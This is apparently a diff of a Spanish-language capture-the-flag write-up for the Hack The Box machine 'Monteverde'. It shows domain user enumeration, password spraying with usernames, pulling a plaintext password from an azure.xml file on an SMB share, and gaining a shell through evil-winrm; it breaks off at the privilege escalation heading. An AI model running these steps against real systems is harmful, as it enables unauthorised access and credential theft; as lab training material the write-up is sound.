-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Azure Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa29&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;File Server Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2e&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Call Recording Admins&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa2f&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Reception&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa30&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Operations&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa31&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Trading&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa32&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;HelpDesk&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa33&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-group:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;Developers&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; rid:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;0xa34&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
-
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Getting domain group memberships:
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;HelpDesk&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2611&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oleary
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Trading&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2610&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;galanos
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Operations&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2609&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;morgan
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Azure Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2601&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Azure Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2601&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;AD_987d7f2f57d2
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Azure Admins&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 2601&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Guests&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 514&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\G&lt;/span&gt;uest
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\k&lt;/span&gt;rbtgt
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;AD_987d7f2f57d2
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ABatchJobs
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-ata
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-bexec
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;vc-netapp
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\d&lt;/span&gt;galanos
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\r&lt;/span&gt;oleary
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Domain Users&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 513&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\s&lt;/span&gt;morgan
-Group &lt;span class=&#34;s1&#34;&gt;&amp;#39;Group Policy Creator Owners&amp;#39;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RID: 520&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; has member: MEGABANK&lt;span class=&#34;se&#34;&gt;\A&lt;/span&gt;dministrator
-
- &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Users on 10.10.10.172 via RID cycling &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RIDS: 500-550,1000-1050&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;=======================================================================&lt;/span&gt; 
-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;E&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Couldn&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;t get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.
-
- &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
-&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;    Getting printer info &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.10.172    &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;
- &lt;span class=&#34;o&#34;&gt;=============================================&lt;/span&gt; 
-Could not initialise spoolss. Error was NT_STATUS_ACCESS_DENIED
-enum4linux &lt;span class=&#34;nb&#34;&gt;complete&lt;/span&gt; on Sat Jan &lt;span class=&#34;m&#34;&gt;18&lt;/span&gt; 19:19:29 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt; ... REDACTED ... &lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; 
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
-&lt;/div&gt;&lt;p&gt;Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar a entrar en la maquina.&lt;/p&gt;
+&lt;/div&gt;&lt;p&gt;Vemos varios usuarios de los cuales no logramos obtener informacion que nos pudiesen ayudar.&lt;/p&gt;
 &lt;h2 id=&#34;smbmap-&#34;&gt;SMBMAP&lt;/h2&gt;
 &lt;p&gt;Utilizamos la lista de usuarios junto con smbmap para verificar que alguno de ellos tenga permisos en alguno de los SHARENAMEs de la maquina utilizando el nombre de usuario como contraseña.&lt;/p&gt;
 &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
@@ -865,49 +795,102 @@ svc-bexec
 &lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
 &lt;/div&gt;
 &lt;/div&gt;&lt;p&gt;Vemos que el usuario SABatchJobs tiene permisos de Lectura en &lt;strong&gt;azure_uploads&lt;/strong&gt; y &lt;strong&gt;users$&lt;/strong&gt;.&lt;/p&gt;
-&lt;h1 id=&#34;user-mhope---azure-psadpasswordcredential&#34;&gt;USER mhope - Azure PSADPasswordCredential&lt;/h1&gt;
+&lt;h1 id=&#34;user-mhope&#34;&gt;USER MHOPE&lt;/h1&gt;
+&lt;h2 id=&#34;azure-psadpasswordcredential&#34;&gt;Azure PSADPasswordCredential&lt;/h2&gt;
 &lt;p&gt;Utilizamos las credenciales para enumerar &lt;code&gt;users$&lt;/code&gt; con smbclient, encontramos un archivo de azure que contiene la contraseña en texto plano en un archivo de XML.&lt;/p&gt;
-&lt;pre&gt;&lt;code&gt;root@aoiri:~/htb/monteverde# smbclient \\\\10.10.10.172\\users$ -U SABatchJobs
-Enter WORKGROUP\SABatchJobs&#39;s password: 
-Try &amp;quot;help&amp;quot; to get a list of possible commands.
-smb: \&amp;gt; dir
-  .                                   D        0  Fri Jan  3 07:12:48 2020
-  ..                                  D        0  Fri Jan  3 07:12:48 2020
-  dgalanos                            D        0  Fri Jan  3 07:12:30 2020
-  mhope                               D        0  Fri Jan  3 07:41:18 2020
-  roleary                             D        0  Fri Jan  3 07:10:30 2020
-  smorgan                             D        0  Fri Jan  3 07:10:24 2020
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;26
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;27
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;28
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;29
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;30
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;31
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;32
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;33
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;34
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;35
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;36
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;37
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;38
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;root@aoiri:~/htb/monteverde# smbclient &lt;span class=&#34;se&#34;&gt;\\\\&lt;/span&gt;10.10.10.172&lt;span class=&#34;se&#34;&gt;\\&lt;/span&gt;users$ -U SABatchJobs
+Enter WORKGROUP&lt;span class=&#34;se&#34;&gt;\S&lt;/span&gt;ABatchJobs&lt;span class=&#34;err&#34;&gt;&amp;#39;&lt;/span&gt;s password: 
+Try &lt;span class=&#34;s2&#34;&gt;&amp;#34;help&amp;#34;&lt;/span&gt; to get a list of possible commands.
+smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:12:48 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:12:48 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  dgalanos                            D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:12:30 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  mhope                               D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:41:18 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  roleary                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:10:30 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  smorgan                             D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:10:24 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
 
-		524031 blocks of size 4096. 519955 blocks available
-smb: \&amp;gt; cd mhope
-smb: \mhope\&amp;gt; dir
-  .                                   D        0  Fri Jan  3 07:41:18 2020
-  ..                                  D        0  Fri Jan  3 07:41:18 2020
-  azure.xml                          AR     1212  Fri Jan  3 07:40:23 2020
+		&lt;span class=&#34;m&#34;&gt;524031&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;519955&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; mhope
+smb: &lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; dir
+  .                                   D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:41:18 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  ..                                  D        &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:41:18 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
+  azure.xml                          AR     &lt;span class=&#34;m&#34;&gt;1212&lt;/span&gt;  Fri Jan  &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; 07:40:23 &lt;span class=&#34;m&#34;&gt;2020&lt;/span&gt;
 
-		524031 blocks of size 4096. 519955 blocks available
-smb: \mhope\&amp;gt; get azure.xml 
-getting file \mhope\azure.xml of size 1212 as azure.xml (1.4 KiloBytes/sec) (average 1.4 KiloBytes/sec)
-smb: \mhope\&amp;gt; exit
+		&lt;span class=&#34;m&#34;&gt;524031&lt;/span&gt; blocks of size 4096. &lt;span class=&#34;m&#34;&gt;519955&lt;/span&gt; blocks available
+smb: &lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; get azure.xml 
+getting file &lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope&lt;span class=&#34;se&#34;&gt;\a&lt;/span&gt;zure.xml of size &lt;span class=&#34;m&#34;&gt;1212&lt;/span&gt; as azure.xml &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;average 1.4 KiloBytes/sec&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+smb: &lt;span class=&#34;se&#34;&gt;\m&lt;/span&gt;hope&lt;span class=&#34;se&#34;&gt;\&amp;gt;&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;exit&lt;/span&gt;
 root@aoiri:~/htb/monteverde# cat azure.xml 
-��&amp;lt;Objs Version=&amp;quot;1.1.0.1&amp;quot; xmlns=&amp;quot;http://schemas.microsoft.com/powershell/2004/04&amp;quot;&amp;gt;
-  &amp;lt;Obj RefId=&amp;quot;0&amp;quot;&amp;gt;
-    &amp;lt;TN RefId=&amp;quot;0&amp;quot;&amp;gt;
+��&amp;lt;Objs &lt;span class=&#34;nv&#34;&gt;Version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.1.0.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;xmlns&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;http://schemas.microsoft.com/powershell/2004/04&amp;#34;&lt;/span&gt;&amp;gt;
+  &amp;lt;Obj &lt;span class=&#34;nv&#34;&gt;RefId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&amp;gt;
+    &amp;lt;TN &lt;span class=&#34;nv&#34;&gt;RefId&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;0&amp;#34;&lt;/span&gt;&amp;gt;
       &amp;lt;T&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/T&amp;gt;
       &amp;lt;T&amp;gt;System.Object&amp;lt;/T&amp;gt;
     &amp;lt;/TN&amp;gt;
     &amp;lt;ToString&amp;gt;Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential&amp;lt;/ToString&amp;gt;
     &amp;lt;Props&amp;gt;
-      &amp;lt;DT N=&amp;quot;StartDate&amp;quot;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
-      &amp;lt;DT N=&amp;quot;EndDate&amp;quot;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
-      &amp;lt;G N=&amp;quot;KeyId&amp;quot;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
-      &amp;lt;S N=&amp;quot;Password&amp;quot;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;
+      &amp;lt;DT &lt;span class=&#34;nv&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;StartDate&amp;#34;&lt;/span&gt;&amp;gt;2020-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
+      &amp;lt;DT &lt;span class=&#34;nv&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;EndDate&amp;#34;&lt;/span&gt;&amp;gt;2054-01-03T05:35:00.7562298-08:00&amp;lt;/DT&amp;gt;
+      &amp;lt;G &lt;span class=&#34;nv&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;KeyId&amp;#34;&lt;/span&gt;&amp;gt;00000000-0000-0000-0000-000000000000&amp;lt;/G&amp;gt;
+      &amp;lt;S &lt;span class=&#34;nv&#34;&gt;N&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;&amp;gt;4n0therD4y@n0th3r$&amp;lt;/S&amp;gt;
     &amp;lt;/Props&amp;gt;
   &amp;lt;/Obj&amp;gt;
 &amp;lt;/Objs&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;pre&gt;&lt;code&gt;Credenciales:
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Credenciales:
 mhope:4n0therD4y@n0th3r$
-&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&#34;evilwinrm&#34;&gt;EvilWinRm&lt;/h2&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;evilwinrm&#34;&gt;EvilWinRm&lt;/h2&gt;
 &lt;p&gt;Ya que el puerto de winrm esta abierto utilizamos las credenciales que tenemos junto con evilwinrm, obtenemos una shell y nuestra flag &lt;strong&gt;user.txt&lt;/strong&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/monteverde/Screenshot_20200120_182009.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
 &lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
